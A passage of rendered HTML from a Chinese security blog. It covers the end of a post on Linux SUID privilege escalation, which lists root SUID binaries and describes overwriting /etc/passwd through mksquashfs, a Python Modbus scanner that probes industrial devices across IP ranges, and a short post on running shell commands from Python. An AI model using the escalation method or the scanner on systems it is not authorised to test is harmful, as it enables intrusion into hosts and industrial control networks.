+<h2 id="suid标志位提权实现思路"><a href="#suid标志位提权实现思路" class="headerlink" title="suid标志位提权实现思路"></a>suid标志位提权实现思路</h2><h3 id="如何发现文件系统中带有suid位"><a href="#如何发现文件系统中带有suid位" class="headerlink" title="如何发现文件系统中带有suid位"></a>如何发现文件系统中带有suid位</h3><p>参考<a href="https://docs.oracle.com/cd/E19683-01/806-4078/6jd6cjs37/index.html" target="_blank" rel="noopener">如何发现suid位的程序</a></p>
+<p>参考<a href="https://www.linux.com/learn/understanding-linux-file-permissions" target="_blank" rel="noopener">Linux下权限设置方法</a></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bash<span class="number">-4.3</span># find / -user root -perm <span class="number">-4000</span> -exec ls -ldb &#123;&#125; \; &gt; /tmp/ckprm</span><br><span class="line"></span><br><span class="line">bash<span class="number">-4.3</span># cat ckprm</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">2302</span> May  <span class="number">7</span>  <span class="number">2017</span> /etc/archivecheck.sh</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">1457</span> May  <span class="number">7</span>  <span class="number">2017</span> /etc/logrotate.eos</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">1750</span> May  <span class="number">7</span>  <span class="number">2017</span> /etc/pre_logrotate_cleanup.sh</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">59364</span> Jan <span class="number">11</span>  <span class="number">2013</span> /usr/bin/chage</span><br><span class="line"></span><br><span class="line">-rws--x--x <span class="number">1</span> root root <span class="number">23276</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/bin/chfn</span><br><span class="line"></span><br><span class="line">-rws--x--x <span class="number">1</span> root root <span class="number">23228</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/bin/chsh</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">6592</span> May  <span class="number">7</span>  <span class="number">2017</span> /usr/bin/conlogd</span><br><span class="line"></span><br><span class="line">-rwsr-sr-x <span class="number">1</span> root root <span class="number">52584</span> Nov <span class="number">27</span>  <span class="number">2012</span> /usr/bin/crontab</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">10708</span> May  <span class="number">7</span>  <span class="number">2017</span> /usr/bin/cvxreplsh</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">76632</span> Jan <span class="number">11</span>  <span class="number">2013</span> /usr/bin/gpasswd</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">15028</span> May  <span class="number">7</span>  <span class="number">2017</span> /usr/bin/issh</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">48224</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/bin/mount</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">36292</span> Jan <span class="number">11</span>  <span class="number">2013</span> /usr/bin/newgrp</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">10692</span> Apr <span class="number">21</span>  <span class="number">2017</span> /usr/bin/oomadj</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">27180</span> Dec  <span class="number">4</span>  <span class="number">2012</span> /usr/bin/passwd</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">36172</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/bin/su</span><br><span class="line"></span><br><span class="line">---s--x--x <span class="number">1</span> root root <span class="number">129792</span> Feb <span class="number">28</span>  <span class="number">2013</span> /usr/bin/sudo</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">23184</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/bin/umount</span><br><span class="line"></span><br><span class="line">-rwsr-x--- <span class="number">1</span> root dbus <span class="number">335288</span> Jun <span class="number">17</span>  <span class="number">2013</span> /usr/lib/dbus<span class="number">-1</span>/dbus-daemon-launch-helper</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">1764212</span> May  <span class="number">7</span>  <span class="number">2017</span> /usr/sbin/cliribd</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">112640</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/sbin/mksquashfs</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">109036</span> Apr  <span class="number">1</span>  <span class="number">2013</span> /usr/sbin/mount.nfs</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">10556</span> Jul <span class="number">12</span>  <span class="number">2013</span> /usr/sbin/pam_timestamp_check</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">779456</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">31516</span> Jul <span class="number">12</span>  <span class="number">2013</span> /usr/sbin/unix_chkpwd</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">74804</span> Apr <span class="number">20</span>  <span class="number">2017</span> /usr/sbin/unsquashfs</span><br><span class="line"></span><br><span class="line">-rws--x--x <span class="number">1</span> root root <span class="number">36064</span> Sep <span class="number">22</span>  <span class="number">2012</span> /usr/sbin/userhelper</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">10768</span> Mar <span class="number">15</span>  <span class="number">2013</span> /usr/sbin/usernetctl</span><br></pre></td></tr></table></figure>
+<p>可以利用已知可加载root执行权限的程序完成提权操作</p>
+<p>利用mksquashfs 加载一个只包含/etc/passwd文件，然后释放到本地，因为具有suid权限，可以覆盖root权限下的/etc/passwd，通过自己设定的用户名口令进入</p>
+<h2 id="后续提权"><a href="#后续提权" class="headerlink" title="后续提权"></a>后续提权</h2><p><a href="http://blog.csdn.net/earbao/article/details/65435050" target="_blank" rel="noopener">提权方法总结</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考Linux下的密码Hash——加密方式与破解方法的技术<a href="https://3gstudent.github.io/3gstudent.github.io/Linux%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81Hash-%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">Linux下的密码Hash——加密方式与破解方法的技术</a></p>
+<p><a href="http://www.cnblogs.com/fhefh/archive/2011/09/20/2182155.html" target="_blank" rel="noopener">suid,guid标志位详解</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/01/15/20180115-linux提权之setuid方法/" data-id="cl3ej0qu30018q4vklf9w8rgx" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/privilge/">privilge</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-20180101-modbus协议扫描器设计与实现" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/01/20180101-modbus协议扫描器设计与实现/" class="article-date">
+  <time datetime="2018-01-01T01:50:08.000Z" itemprop="datePublished">2018-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/tools/">tools</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/01/20180101-modbus协议扫描器设计与实现/">Modbus协议扫描器的分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="modbus-协议分析"><a href="#modbus-协议分析" class="headerlink" title="modbus 协议分析"></a>modbus 协议分析</h1><hr>
+<p>Modbus Packet Structure 协议格式</p>
+<table>
+<thead>
+<tr>
+<th>Trans ID</th>
+<th>ProtoID(0)</th>
+<th>Length</th>
+<th>UnitID</th>
+<th>FunctCode</th>
+<th>Data</th>
+<th>len(0-253byte)</th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>\x00\x00</td>
+<td>\x00\x00</td>
+<td>\x00\x00    \x11        \x00        </td>
+</tr>
+</tbody>
+</table>
+<h1 id="协议扫描代码"><a href="#协议扫描代码" class="headerlink" title="协议扫描代码"></a>协议扫描代码</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import array</span><br><span class="line">import optparse</span><br><span class="line">from IPy import IP</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">	<span class="keyword">p</span> = optparse.OptionParser(	description=<span class="string">' Finds modbus devices in IP range and determines slave id.\nOutputs in ip:port &lt;tab&gt; sid format.'</span>,</span><br><span class="line">								prog=<span class="string">'modscan'</span>,</span><br><span class="line">								<span class="keyword">version</span>=<span class="string">'modscan 0.1'</span>,</span><br><span class="line">								usage = <span class="string">"usage: %prog [options] IPRange"</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'--port'</span>, <span class="string">'-p'</span>, <span class="built_in">type</span>=<span class="string">'int'</span>, dest=<span class="string">"port"</span>, default=<span class="number">502</span>, <span class="keyword">help</span>=<span class="string">'modbus port DEFAULT:502'</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'--timeout'</span>, <span class="string">'-t'</span>, <span class="built_in">type</span>=<span class="string">'int'</span>, dest=<span class="string">"timeout"</span>, default=<span class="number">500</span>, <span class="keyword">help</span>=<span class="string">'socket timeout (mills) DEFAULT:500'</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'--aggressive'</span>, <span class="string">'-a'</span>, action =<span class="string">'store_true'</span>, <span class="keyword">help</span>=<span class="string">'continues checking past first found SID'</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'--function'</span>, <span class="string">'-f'</span>, <span class="built_in">type</span>=<span class="string">'int'</span>, dest=<span class="string">"function"</span>, default=<span class="number">17</span>, <span class="keyword">help</span>=<span class="string">'MODBUS Function Code DEFAULT:17'</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'--data'</span>, <span class="built_in">type</span>=<span class="string">'string'</span>, dest=<span class="string">"fdata"</span>, <span class="keyword">help</span>=<span class="string">'MODBUS Function Data.  Unicode escaped "\x00\x01"'</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'-v'</span>, <span class="string">'--verbose'</span>, action =<span class="string">'store_true'</span>, <span class="keyword">help</span>=<span class="string">'returns verbose output'</span>)</span><br><span class="line">	<span class="keyword">p</span>.add_option(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, action =<span class="string">'store_true'</span>, <span class="keyword">help</span>=<span class="string">'returns extremely verbose output'</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">options</span>, arguments = <span class="keyword">p</span>.parse_args()</span><br><span class="line"></span><br><span class="line">	#make sure we have at least <span class="number">1</span> <span class="keyword">argument</span> (IP Addresses)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(arguments) == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">		#build basic packet <span class="keyword">for</span> this test</span><br><span class="line"></span><br><span class="line">		<span class="string">""</span><span class="comment">"</span></span><br><span class="line">		Modbus Packet Structure</span><br><span class="line">		\x00\x00	\x00\x00	\x00\x00	\x11		\x00		&lt;=================&gt;</span><br><span class="line">		Trans ID	ProtoID(<span class="number">0</span>)	Length		UnitID		FunctCode	Data <span class="built_in">len</span>(<span class="number">0</span>-<span class="number">253</span>byte)</span><br><span class="line">		<span class="string">""</span><span class="comment">"</span></span><br><span class="line"></span><br><span class="line">		#this must <span class="keyword">be</span> stored in <span class="keyword">a</span> unsigned byte aray <span class="keyword">so</span> we can <span class="keyword">make</span> the assignment <span class="keyword">later</span>... <span class="keyword">no</span> <span class="built_in">string</span>[] in <span class="keyword">python</span> :(</span><br><span class="line">		rsid = array.array(<span class="string">'B'</span>)</span><br><span class="line">		rsid.fromstring(<span class="string">"\x00\x00\x00\x00\x00\x02\x01\x01"</span>)</span><br><span class="line">		#设置modbus功能码</span><br><span class="line">		#set <span class="function"><span class="keyword">function</span></span></span><br><span class="line">		rsid[<span class="number">7</span>]=<span class="keyword">options</span>.<span class="keyword">function</span></span><br><span class="line"></span><br><span class="line">		#add <span class="function"><span class="keyword">function</span> <span class="title">data</span></span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">options</span>.fdata):</span><br><span class="line">			aFData = array.array(<span class="string">'B'</span>)</span><br><span class="line"></span><br><span class="line">			#we must decode the escaped unicode before calling fromstring otherwise the literal \xXX will <span class="keyword">be</span> interpreted</span><br><span class="line">			aFData.fromstring(<span class="keyword">options</span>.fdata.decode(<span class="string">'unicode-escape'</span>) )</span><br><span class="line">			rsid += aFData</span><br><span class="line">			</span><br><span class="line">			#update length</span><br><span class="line">			rsid[<span class="number">5</span>]=<span class="built_in">len</span>(aFData)+<span class="number">2</span></span><br><span class="line">			#为什么还要加两个？？？表示很诧异</span><br><span class="line"></span><br><span class="line">		#assign IP <span class="built_in">range</span></span><br><span class="line">		iprange=IP(arguments[<span class="number">0</span>])</span><br><span class="line">		</span><br><span class="line">		#print friendly user message</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Starting Scan..."</span></span><br><span class="line"></span><br><span class="line">		#primary loop over IP addresses</span><br><span class="line">		<span class="keyword">for</span> ip in iprange:</span><br><span class="line">		</span><br><span class="line">			#print str(ip)+<span class="string">" made it"</span></span><br><span class="line">			#loop over possible sid <span class="built_in">values</span> (<span class="number">1</span>-<span class="number">247</span>)</span><br><span class="line">			<span class="keyword">for</span> sid in <span class="built_in">range</span> (<span class="number">1</span>, <span class="number">247</span>):	</span><br><span class="line">			</span><br><span class="line">				#error messaging</span><br><span class="line">				fError=<span class="number">0</span></span><br><span class="line">				msg = str(ip)+<span class="string">":"</span>+str(<span class="keyword">options</span>.port)+<span class="string">"\t"</span>+str(sid)</span><br><span class="line">				</span><br><span class="line">				#print <span class="string">"msg="</span>+msg</span><br><span class="line"></span><br><span class="line">				#Wrap connect in <span class="keyword">a</span> <span class="keyword">try</span> box</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					#socket object instantiation</span><br><span class="line">					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">					#set socket timeout, value from cmd <span class="keyword">is</span> in mills</span><br><span class="line">					s.settimeout(float(<span class="keyword">options</span>.timeout) / float(<span class="number">1000</span>))			</span><br><span class="line"></span><br><span class="line">					#connect requires ip addresses in <span class="built_in">string</span> format <span class="keyword">so</span> it must <span class="keyword">be</span> cast</span><br><span class="line">					s.connect((str(ip), <span class="keyword">options</span>.port))</span><br><span class="line"></span><br><span class="line">				except socket.error:</span><br><span class="line">					#clean <span class="keyword">up</span></span><br><span class="line">					fError=<span class="number">1</span></span><br><span class="line">					msg += <span class="string">"\tFAILED TO CONNECT"</span></span><br><span class="line">					s.<span class="keyword">close</span>()</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				#end <span class="keyword">try</span></span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">				#send query <span class="keyword">to</span> device</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">					#set slave id</span><br><span class="line">					rsid[<span class="number">6</span>]=sid		</span><br><span class="line"></span><br><span class="line">					#send data <span class="keyword">to</span> device</span><br><span class="line">					s.send(rsid)</span><br><span class="line">					</span><br><span class="line">				except socket.error:</span><br><span class="line">					#failed send <span class="keyword">close</span> socket</span><br><span class="line">					fError=<span class="number">1</span></span><br><span class="line">					msg += <span class="string">"\tFAILED TO SEND"</span></span><br><span class="line">					s.<span class="keyword">close</span>()</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				#end <span class="keyword">try</span></span><br><span class="line">				</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">					#recieve data</span><br><span class="line">					data = s.recv(<span class="number">1024</span>)</span><br><span class="line">					</span><br><span class="line">				except socket.timeou<span class="variable">t:</span></span><br><span class="line">					fError=<span class="number">1</span></span><br><span class="line">					msg += <span class="string">"\tFAILED TO RECV"</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				#end <span class="keyword">try</span></span><br><span class="line"></span><br><span class="line">				#examine response</span><br><span class="line">				<span class="keyword">if</span> dat<span class="variable">a:</span></span><br><span class="line">					#parse response</span><br><span class="line">					resp = array.array(<span class="string">'B'</span>)</span><br><span class="line">					resp.fromstring(data)</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">options</span>.<span class="keyword">debug</span>):</span><br><span class="line">						<span class="keyword">print</span> <span class="string">"Recieved: "</span>+str(resp)</span><br><span class="line">						<span class="keyword">print</span> (<span class="keyword">int</span>(resp[<span class="number">7</span>]) == <span class="keyword">int</span>(<span class="keyword">options</span>.<span class="keyword">function</span>))</span><br><span class="line"></span><br><span class="line">					#if the <span class="function"><span class="keyword">function</span> <span class="title">matches</span> <span class="title">the</span> <span class="title">one</span> <span class="title">sent</span> <span class="title">we</span> <span class="title">are</span> <span class="title">all</span> <span class="title">good</span></span></span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">int</span>(resp[<span class="number">7</span>]) == <span class="keyword">int</span>(<span class="keyword">options</span>.<span class="keyword">function</span>)):</span><br><span class="line">						<span class="keyword">print</span> msg</span><br><span class="line">						</span><br><span class="line">						#in aggressive <span class="keyword">mode</span> we keep going</span><br><span class="line">						<span class="keyword">if</span> (not <span class="keyword">options</span>.aggressive):</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">							</span><br><span class="line">					#If the <span class="function"><span class="keyword">function</span> <span class="title">matches</span> <span class="title">the</span> <span class="title">one</span> <span class="title">sent</span> + 0<span class="title">x80</span> <span class="title">a</span> <span class="title">positive</span> <span class="title">response</span> <span class="title">error</span> <span class="title">code</span> <span class="title">is</span> <span class="title">detected</span></span></span><br><span class="line">					elif <span class="keyword">int</span>(resp[<span class="number">7</span>]) == (<span class="keyword">int</span>(<span class="keyword">options</span>.<span class="keyword">function</span>)+<span class="number">128</span>):</span><br><span class="line">						#if <span class="keyword">debug</span> output message</span><br><span class="line">						msg += <span class="string">"\tPositive Error Response"</span></span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">options</span>.<span class="keyword">debug</span>):</span><br><span class="line">							<span class="keyword">print</span> msg							</span><br><span class="line">					<span class="keyword">else</span>:</span><br><span class="line">						#if <span class="keyword">debug</span> output message</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">options</span>.<span class="keyword">debug</span>):</span><br><span class="line">							<span class="keyword">print</span> msg					</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					fError=<span class="number">1</span></span><br><span class="line">					msg += <span class="string">"\tFAILED TO RECIEVE"</span></span><br><span class="line">					s.<span class="keyword">close</span>()</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line">			#end SID <span class="keyword">for</span></span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			#report based <span class="keyword">on</span> verbosity</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">options</span>.<span class="keyword">verbose</span> <span class="built_in">and</span> fError):</span><br><span class="line">				<span class="keyword">print</span> msg</span><br><span class="line">			elif (<span class="keyword">options</span>.<span class="keyword">debug</span>):</span><br><span class="line">				<span class="keyword">print</span> msg</span><br><span class="line">		#end IP <span class="keyword">for</span></span><br><span class="line">				</span><br><span class="line">		#close socket, <span class="keyword">no</span> longer needed</span><br><span class="line">		#s.shutdown(socket.SHUT_RDWR)</span><br><span class="line">		s.<span class="keyword">close</span>()</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Scan Complete."</span></span><br><span class="line"></span><br><span class="line">	#bad <span class="keyword">number</span> of arguments.  <span class="keyword">print</span> <span class="keyword">help</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">p</span>.print_help()</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">try</span> : main()</span><br><span class="line">	except KeyboardInterrup<span class="variable">t:</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Scan canceled by user."</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Thank you for using ModScan"</span></span><br><span class="line">	except :</span><br><span class="line">		sys.<span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/01/01/20180101-modbus协议扫描器设计与实现/" data-id="cl3ej0qu00011q4vkth3wuwhe" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-20171030-Pyhon执行cmd命令的若干方式" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/10/30/20171030-Pyhon执行cmd命令的若干方式/" class="article-date">
+  <time datetime="2017-10-30T01:50:08.000Z" itemprop="datePublished">2017-10-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Coding/">Coding</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/10/30/20171030-Pyhon执行cmd命令的若干方式/">Python执行系统命令方法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Python-执行系统命令的三种方法"><a href="#Python-执行系统命令的三种方法" class="headerlink" title="Python 执行系统命令的三种方法"></a>Python 执行系统命令的三种方法</h1><h2 id="Python-OS-库函数"><a href="#Python-OS-库函数" class="headerlink" title="Python OS 库函数"></a>Python OS 库函数</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.<span class="keyword">system</span>(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="Python-os-popen-库函数"><a href="#Python-os-popen-库函数" class="headerlink" title="Python os popen 库函数"></a>Python os popen 库函数</h2><p>打开一个管道，然后将命令返回结果输出到日志。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">popen</span><span class="params">(command [, mode=<span class="string">'r'</span> [, bufsize]])</span></span> -&gt; pipe</span><br><span class="line">Open <span class="selector-tag">a</span> pipe to/from <span class="selector-tag">a</span> command returning <span class="selector-tag">a</span> file <span class="selector-tag">object</span>.</span><br></pre></td></tr></table></figure>
+<p>具体操作：</p>
+<p>在Python命令行下：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tmp = <span class="built_in">os</span>.<span class="built_in">popen</span>(<span class="string">'ls *.py'</span>).readlines()</span><br><span class="line">tmp</span><br></pre></td></tr></table></figure>
+<h2 id="Python-subprocess"><a href="#Python-subprocess" class="headerlink" title="Python subprocess"></a>Python subprocess</h2><pre><code>import subprocess 
+subprocess.call ([&quot;cmd&quot;, &quot;arg1&quot;, &quot;arg2&quot;],shell=True)
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
